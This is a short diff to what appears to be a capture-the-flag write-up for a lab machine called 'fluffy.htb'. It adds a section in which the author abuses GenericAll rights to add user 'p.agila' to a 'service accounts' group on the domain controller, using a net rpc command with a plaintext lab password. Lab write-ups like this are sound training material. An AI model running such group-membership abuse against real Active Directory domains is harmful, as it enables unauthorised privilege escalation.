@@ -315,3 +315,8 @@ None of these hashes cracked however
 ![[Pasted image 20260324183727.png]]
 So i have GenericAll over the service accounts group
 
+## Adding `p.agila` to service accounts group
+```python
+net rpc group addmem "service accounts" "p.agila" -U "fluffy.htb"/"p.agila"%'prometheusx-303' -S "dc01.fluffy.htb"
+```
+
